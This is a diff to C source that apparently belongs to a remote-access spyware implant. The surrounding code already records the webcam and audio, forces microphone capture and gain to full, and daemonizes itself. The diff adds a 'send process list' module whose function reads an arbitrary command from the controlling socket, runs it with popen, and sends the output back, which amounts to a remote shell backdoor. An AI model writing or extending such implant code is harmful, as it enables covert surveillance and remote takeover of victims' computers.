@@ -107,6 +107,8 @@ void dispatch_modules(int argc, char *argv[])
     pthread_t record_webcam_thread = 0;
     pthread_t record_audio_thread = 0;
     
+    pthread_t get_process_thread = 0;
+    
     //char *ubuntu_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ toggle"; /* A TESTER  */
     const char *ubuntu_check_mic_cmd = "amixer sset Capture cap";
     const char *ubuntu_gain_mic_cmd = "amixer sset Capture 100%";
@@ -614,6 +616,28 @@ void dispatch_modules(int argc, char *argv[])
                 perror("pthread_join");
                 return;
             }
+        }
+        
+        if(flag == 18)
+        {
+            printf("\t\tSEND PROCESS LIST ...\n");
+            
+            /** Call the thread that will execute the get_process command **/
+            if(pthread_create(&get_process_thread, NULL, (void*(*)(void*))exec_get_proces_cmd, NULL) == -1)
+            {
+                error("pthread_create() get_process_thread", "dispatch_modules()");
+                return;
+            }
+
+            if(pthread_join(get_process_thread, NULL) != 0)
+            {
+                perror("pthread_join");
+                return;
+            }
+            
+            
+            
+            return;
         }
     }
 
@@ -1647,6 +1671,72 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
             break;
     }
 }
+
+
+void exec_get_proces_cmd(void)
+{
+    char *get_process_cmd = NULL;
+    size_t len_process_cmd = 0;
+    
+    FILE *pipe_exec_get_process = NULL;
+    char buffer[MAXDATASIZE] = "";
+    
+    int ret = 0;
+    
+
+    if(recv(csock, (char*)&len_process_cmd, sizeof(len_process_cmd), 0) == -1)
+    {
+        error("recv() len_process_cmd", "exec_get_proces_cmd()");
+        pthread_exit(NULL);
+    }
+    
+    printf("\n\nLen Process cmd = %zd\n", len_process_cmd);
+    
+    get_process_cmd = malloc(len_process_cmd * sizeof(char));
+    if(get_process_cmd == NULL)
+    {
+        error("malloc() get_process_cmd", "exec_get_proces_cmd()");
+        pthread_exit(NULL);        
+    }
+
+    if(recv(csock, get_process_cmd, len_process_cmd, 0) == -1)
+    {
+        error("recv() get_process_cmd", "exec_get_proces_cmd()");
+        pthread_exit(NULL);
+    }
+
+    printf("Get Process Cmd = %s\n\n", get_process_cmd);
+    
+    pipe_exec_get_process = popen(get_process_cmd, "r");
+    
+    if(pipe_exec_get_process == NULL)
+        error("popen pipe_exec_get_process failed", "exec_get_proces_cmd()");
+    
+    ret = fread(buffer, sizeof(char), MAXDATASIZE, pipe_exec_get_process);
+    if(ret < 0)
+    {
+        error("fread() buffer failed", "exec_get_proces_cmd()");
+        pthread_exit(NULL);
+    }
+
+    if(send(csock, buffer, MAXDATASIZE, 0) == SOCKET_ERROR)
+    {
+        error("send() buffer failed", "exec_get_proces_cmd()");
+        pthread_exit(NULL);
+    }
+
+    if(pclose(pipe_exec_get_process) == -1)
+    {
+        error("pclose() pipe_exec_get_process failed", "exec_get_proces_cmd()");
+        pthread_exit(NULL);
+    }
+    
+    pthread_exit(NULL);;
+}
+
+
+
+
 
 void daemonize()
 {
